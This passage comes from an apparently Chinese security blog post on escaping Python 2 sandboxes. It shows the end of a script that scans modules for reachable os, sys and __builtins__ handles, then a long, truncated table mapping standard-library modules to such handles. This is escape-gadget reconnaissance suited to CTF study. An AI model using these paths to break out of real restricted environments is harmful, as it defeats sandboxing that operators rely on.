                <span class="hljs-keyword">else</span>:
                    result = <span class="hljs-string">&#x27;no&#x27;</span>

                results[module][<span class="hljs-string">&#x27;result&#x27;</span>][method] = result

        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-comment"># print(e)</span>
            <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">return</span> results
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_result</span>(<span class="hljs-params">results</span>):</span>
    <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:
        <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;flag&#x27;</span>]:
            print(<span class="hljs-string">&#x27;[+]&#x27;</span> + result)
            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>]:
                print(<span class="hljs-string">&#x27;  [-]&#x27;</span> + r + <span class="hljs-string">&#x27;: &#x27;</span> + results[result][<span class="hljs-string">&#x27;result&#x27;</span>][r])


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    print_result(search_for_os_sys_builins())

</code></pre></div>



![image-20200929220602143](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200929220602143.png)



可以看到默认的89个模块中只有linecache能够满足要求，其他的库都需要额外引入才行。





## 0x02 python2 其他逃逸方法

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># coding=UTF-8</span>

find_modules = &#123;<span class="hljs-string">&#x27;filecmp&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;heapq&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;code&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;hotshot&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;distutils&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;functools&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;random&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;tty&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;subprocess&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;sysconfig&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;whichdb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;runpy&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pty&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-atheos&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;xml&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sgmllib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;importlib&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;UserList&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;tempfile&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;mimify&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pprint&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;platform&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;collections&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;cProfile&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;smtplib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;compiler&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>],
                <span class="hljs-string">&#x27;string&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;SocketServer&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-darwin&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;zipfile&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;repr&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;wave&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;curses&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;antigravity&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-irix6&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-freebsd6&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-freebsd7&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-freebsd4&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-freebsd5&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-freebsd8&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;aifc&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
                <span class="hljs-string">&#x27;sndhdr&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;cookielib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;ConfigParser&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;httplib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;_MozillaCookieJar&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;bisect&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;decimal&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;cmd&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;binhex&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sunau&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
                <span class="hljs-string">&#x27;pydoc&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-riscos&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;token&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;Bastion&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;msilib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;shlex&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;quopri&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;multiprocessing&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;dummy_threading&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;dircache&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;asyncore&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;pkgutil&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;compileall&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;locale&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;chunk&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;macpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;popen2&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;mimetypes&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;toaiff&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;atexit&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pydoc_data&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;tabnanny&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;HTMLParser&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;encodings&#x27;</span>: [<span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;calendar&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;mailcap&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-unixware7&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;abc&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plistlib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;bdb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;py_compile&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>],
                <span class="hljs-string">&#x27;pipes&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;rfc822&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;tarfile&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;struct&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;urllib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;fpformat&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;re&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>], <span class="hljs-string">&#x27;mutex&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;ntpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;UserString&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;new&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;formatter&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;email&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;cgi&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;ftplib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-linux2&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;ast&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;optparse&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;UserDict&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;inspect&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;mailbox&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;Queue&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;fnmatch&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;ctypes&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;codecs&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;getopt&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;md5&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;cgitb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;commands&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;logging&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;socket&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-irix5&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sre&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>],
                <span class="hljs-string">&#x27;ensurepip&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;traceback&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;netrc&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;wsgiref&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-generic&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;weakref&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;ihooks&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;telnetlib&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;doctest&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pstats&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;smtpd&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;_pyio&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
                <span class="hljs-string">&#x27;dis&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;os&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
                <span class="hljs-string">&#x27;pdb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;this&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;base64&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;os2emxpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;glob&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;unittest&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;dummy_thread&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;fileinput&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;__future__&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;robotparser&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-mac&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;_threading_local&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;_LWPCookieJar&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;wsgiref.egg-info&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sha&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;sre_constants&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;json&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;Cookie&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;tokenize&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-beos5&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;rexec&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;lib-tk&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;textwrap&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;fractions&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sqlite3&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;posixfile&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
                <span class="hljs-string">&#x27;imaplib&#x27;</span>: [<span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;xdrlib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;imghdr&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;macurl2path&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;_osx_support&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;webbrowser&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
